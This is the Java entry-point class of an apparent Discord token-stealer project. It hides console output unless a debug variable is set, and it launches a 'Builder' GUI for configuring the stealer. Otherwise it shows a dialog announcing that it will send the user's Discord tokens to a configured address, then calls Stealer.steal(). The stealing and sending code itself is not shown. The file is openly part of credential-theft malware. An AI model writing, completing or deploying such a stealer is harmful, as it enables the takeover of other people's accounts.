package de.romjaki.tokenstealer;

import de.romjaki.tokenstealer.builder.Builder;
import de.romjaki.tokenstealer.builder.Config;
import de.romjaki.tokenstealer.stealer.Stealer;

import javax.swing.*;
import java.io.OutputStream;
import java.io.PrintStream;
import java.util.Objects;

import static javax.swing.WindowConstants.EXIT_ON_CLOSE;

public class Main {
    public static void main(String[] args) {
        PrintStream nullStream = new PrintStream(new OutputStream() {
            @Override
            public void write(int i) {
            }
        });
        if (!Objects.equals(System.getenv("DEBUG_DISCORDTS"), "true")) {
            System.setOut(nullStream);
            System.setErr(nullStream);
        }
        System.out.println("DEBUG ACTIVATE!");
        Config.load(args);
        if (Config.INSTANCE == null) {
            Builder builder = new Builder();
            builder.setDefaultCloseOperation(EXIT_ON_CLOSE);
            builder.setVisible(true);
        } else if (
                JOptionPane.showConfirmDialog(
                        null,
                        "I'm gonna send your discord token(s) to "
                                + Config.INSTANCE.getRequest()
                                + ". Are you okay with this?",
                        "WARNING",
                        JOptionPane.OK_CANCEL_OPTION, JOptionPane.ERROR_MESSAGE
                ) == JOptionPane.OK_OPTION) {
            Stealer.steal();
        }
    }

}
